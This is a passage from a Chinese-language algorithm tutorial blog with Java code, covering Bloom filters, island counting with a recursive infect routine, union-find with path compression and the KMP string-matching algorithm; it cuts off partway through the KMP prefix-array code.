class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>布隆过滤器就是一个大的位图，有m个bit，k个哈希函数，输入一个url，然后通过k个哈希函数得到k个值，%m之后放到位图中，即将位图中k个数置1。当判断某个url时，同样做k个哈希运算，如果得到的那些bit位都是1，那么该url一定是黑名单，如果有一个不是1，那么就不是黑名单</p><p>所以m和k的选择是非常重要的，m选的小就意味着对于大数据量来说置1的bit位多，导致大量不在黑名单中的有可能被误判为黑名单，k选的大即哈希函数过多，那么每次哈希出来的数量也是置1的bit位较多，导致误判</p><p>m和k通过以下公式确定（注意都要向上取整，往大了取整）</p><p>n = 样本量， p = 失误率</p><p>$m=-\frac{n\times lnp}{(ln2)^2}$</p><p>$k=ln2\times \frac{m}{n}\approx0.7\times \frac{m}{n}$</p><p>如果m算出来是26G，允许更大的内存32G的话，我们的失误率当然会更低</p><p>$P_真=（1-e^{-\frac{n\times k}{m_真}}）^k$</p><h3 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h3><p><a href="https://www.bilibili.com/video/BV13g41157hK?p=11&amp;t=7146.3">https://www.bilibili.com/video/BV13g41157hK?p=11&amp;t=7146.3</a></p><h2 id="岛问题"><a href="#岛问题" class="headerlink" title="岛问题"></a>岛问题</h2><p>一个矩阵中只有0和1两种值，每个位置都可以和自己的上、下、左、右 四个位置相连，如 果有一片1连在一起，这个部分叫做一个岛，求一个矩阵中有多少个岛?</p><p>001010</p><p>111010</p><p>100100</p><p>000000</p><p>这个矩阵中有三个岛</p><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>设计一个感染函数，遍历矩阵，遇到1就将其及其上下左右为1的位置感染为2，这是递归过程，也就是说其上下左右位置继续递归感染，直至无法感染为止，这种感染过程整个完成1次即视为1个岛</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">infect</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> i <span class="token operator">>=</span> <span class="token class-name">N</span> <span class="token operator">||</span> j <span class="token operator">>=</span> <span class="token class-name">M</span> <span class="token operator">||</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">isLand</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>matrix <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">M</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">M</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>如何使用并行算法解决该问题？</p><p>首先考虑两个CPU的情况</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f1.png"></p><p>将矩阵分割开，一个CPU搞一半，同样进行上面的感染过程，得出左侧两个岛，右侧两个岛，然后两个CPU还需要进行额外的工作，即对边界情况保存该点是由哪个点感染来的，可以看出左侧边界第一行第4列是由第一行第一列感染来的，都记为A，B, C, D都是如此，最后再对左右两侧进行合并，检查边界情况，从第一行开始看，第一行第4列属于A集合，第5列属于C集合，查询到不属于同一个集合，进行union操作，然后总岛数-1，第三行，union集合B和C，总岛数-1，第5行，union集合B和D，总岛数-1，最后一行，看到A和D属于同一集合，结束</p><p>多个CPU情况类似，将矩阵分N块，然后每个CPU额外收集边界信息，最后归并即可</p><h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><p>对于a, b, c, d, e</p><p>每个字母先各自成为1个集合，那么现在就总共5个集合，并查集需要的方法为</p><p>1）isSameSet(a, b) 是否属于同一个集合</p><p>2）union(a, b) 将a的集合和b的集合合为一个集合</p><p>对于以上两个方法，经典的数据结构无法实现都是O(1)的，比如链表，可以使union方法快，但是查询是否同一个集合则需要遍历，较慢，又比如哈希set，查询是否同一个快，但是union又较慢</p><p>所以我们设计这样一种结构，每个集合都有自己的代表节点，每个节点也都有自己的父节点，代表节点的父节点是自己，那么在查询是否为同一集合时，可以查看各自的代表节点是否是同一个即可（即不断往上找父节点，直到父节点为自己为止），在union操作时，元素少的集合的代表节点的父节点不再指向自己，而是指向元素多的集合的代表节点</p><p>借助三个哈希表，</p><p>elementMap 将用户的元素类型包一层element类型，并且一一对应在表里</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">V</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">element</span><span class="token punctuation">(</span><span class="token class-name">V</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> val<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fatherMap 记录每个节点的父节点（即指向关系，节点指向父节点）</p><p>sizeMap 只记录代表节点，value则为该代表节点所在集合的元素个数</p><p>显然，如果集合中某个链过长的话，查询是否同一集合则会变得较慢，所以为了加速union过程，可以在往上找父节点的时候，同时记录路途中遍历到的节点，放在栈里，找到代表节点的时候，把途中的节点全都改成直接指向代表节点，这就处理了某个链过长的情况</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> unionFind<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">,</span> element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">></span></span> elementMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">,</span> element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">></span></span> fatherMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> sizeMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">unionFind</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> list<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        elementMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fatherMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sizeMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">V</span> each<span class="token operator">:</span>list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> <span class="token keyword">new</span> element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            elementMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            fatherMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            sizeMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> <span class="token function">findHead</span><span class="token punctuation">(</span>element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span>element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>fatherMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">!=</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            e <span class="token operator">=</span> fatherMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> fatherMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSameSet</span><span class="token punctuation">(</span><span class="token class-name">V</span> a<span class="token punctuation">,</span> <span class="token class-name">V</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token class-name">V</span> a<span class="token punctuation">,</span> <span class="token class-name">V</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> aF <span class="token operator">=</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> bF <span class="token operator">=</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>aF <span class="token operator">!=</span> bF<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">// 找到哪个集合元素个数多</span>                element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> big <span class="token operator">=</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>aF<span class="token punctuation">)</span> <span class="token operator">>=</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>bF<span class="token punctuation">)</span> <span class="token operator">?</span> aF <span class="token operator">:</span> bF<span class="token punctuation">;</span>                element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> small <span class="token operator">=</span> big <span class="token operator">==</span> aF <span class="token operator">?</span> bF <span class="token operator">:</span> aF<span class="token punctuation">;</span>                fatherMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>small<span class="token punctuation">,</span> big<span class="token punctuation">)</span><span class="token punctuation">;</span>                sizeMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>big<span class="token punctuation">,</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>small<span class="token punctuation">)</span> <span class="token operator">+</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>big<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                sizeMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>small<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h2><p>str1，str2 检测str2是否是str1的子串</p><p>显然str1长度&lt;str2长度的话，肯定不是其子串</p><p>经典暴力方法：</p><p>str1从0开始，str2从0开始，都开始比对，出现不一样的，</p><p>就str1从1开始，str2再次从0开始，出现不一样的，</p><p>str1从2开始，str2再次从0开始</p><p>下面介绍KMP，首先需要引入一个关于str2的数组</p><p>arr[i] 代表str2的第i位置不看，研究前面所有的i个字母，计算得出这i个字母的同样长度的前缀和后缀全部相等的最大的一个长度</p><blockquote><p>对于字符串”abbabbk”，看字母k往前的所有字母</p><table><thead><tr><th>长度</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>前缀</td><td>a</td><td>ab</td><td>abb</td><td>abba</td><td>abbab</td></tr><tr><td>后缀</td><td>b</td><td>bb</td><td>abb</td><td>babb</td><td>bbabb</td></tr></tbody></table><p>显然3是最大的长度，长度为6即包含了整个前面的字母，那么前后缀一定相等，所以不考虑长度6</p></blockquote><p>对于str2”aabaabsaabaabst”</p><p>数组arr</p><table><thead><tr><th>index</th><th>0、1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>…</th></tr></thead><tbody><tr><td>arr[index]</td><td>固定值-1，0</td><td>1</td><td>0</td><td>1</td><td>2</td><td>…</td></tr></tbody></table><p>str1 i, i+1, …, x</p><p>str2 0, 1, … y</p><p>比对过程中在x和y处发现不一样（即x之前的所有和y之前的所有完全一样），经典算法会选择str1回到i+1，str2回到0，然而KMP算法则不是这样</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f2.png"></p><p>str1会继续在x位置，str2则会回到最大前缀的下一个字符的位置，然后位置x和新的位置y开始进行比对</p><p>两个实质：</p><p>1）相当于str1从j位置开始，str2从0位置开始检查，但是由于前缀后缀相等的缘故，可以省略位置j到位置x-1的比对，直接比对x和新的位置y</p><p>2）从位置i到位置j之间的任何一个位置k开始，都一定不能配出str2</p><blockquote><p>证明：假设能配出str2的话，那么至少位置k到位置x-1是与str2的前(x-k)个字符是完全相等的，又已知x之前的所有和y之前的所有完全一样，即位置k到位置x-1是与str2从位置y往前移(x-k)个字符开始的串是完全一样的，这就说明一个更长的前缀后缀长度出现了，悖论！</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f3.png"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f4.png"></p><p>图解过程：</p><p>首先第一次是e和w不一样，然后str2回到字母t，重新比对，</p><p>e跟t又不一样，str2回到字母s重新比对，</p><p>e跟s又又不一样，str2回到字母a重新比对，</p><p>又又又不一样，（说明我str2已经来到0位置还配不出来，str1换个开头吧）str1挪到e的下一个重新开始比对</p><blockquote><p>KMP算法最终会返回str1中子串str2的起始下标</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">KMP</span><span class="token punctuation">(</span><span class="token class-name">String</span> s1<span class="token punctuation">,</span> <span class="token class-name">String</span> s2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>s1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> s2 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> s2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> s1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> s2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars1 <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars2 <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token function">getArray</span><span class="token punctuation">(</span>chars2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i1 <span class="token operator">&lt;</span> chars1<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> i2 <span class="token operator">&lt;</span> chars2<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>chars1<span class="token punctuation">[</span>i1<span class="token punctuation">]</span> <span class="token operator">==</span> chars2<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            i1<span class="token operator">++</span><span class="token punctuation">;</span>            i2<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> i1<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// 即str2已经跳到开头，还是不一样</span>        <span class="token keyword">else</span> i2 <span class="token operator">=</span> arr<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 跳出循环的结果是要么i2越界即i2全部比对成功，否则就是失败</span>    <span class="token keyword">return</span> i2 <span class="token operator">==</span> chars2<span class="token punctuation">.</span>length <span class="token operator">?</span> i1 <span class="token operator">-</span> i2 <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么如何求数组arr</p><p>首先arr[0]和arr[1]都是固定值-1，0</p><p>arr[i]需要用到arr[i-1]，假设arr[i-1]记为cn，我们比较位置cn处的字母（即前缀后面的第一个字母）与i-1处的字母，如果相等，则arr[i]=cn+1</p><p>否则cn往前跳，cn=arr[cn]，重复之前的操作，比较位置cn处的字母与位置i-1，如果相等，则arr[i]=cn+1</p><p>跳到-1还不行就为0</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f5.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getArray</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> str<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 这是位置cn处的字母与位置i-1相等的情况，所以给arr[i]赋值为cn+1，随即i自增1</span>        <span class="token comment">// 那么下一个位置也就是新的arr[i]会使用arr[i-1]，也就是cn+1，所以为了精简代码，直接++cn</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>cn<span class="token punctuation">]</span> <span class="token operator">==</span> str<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token 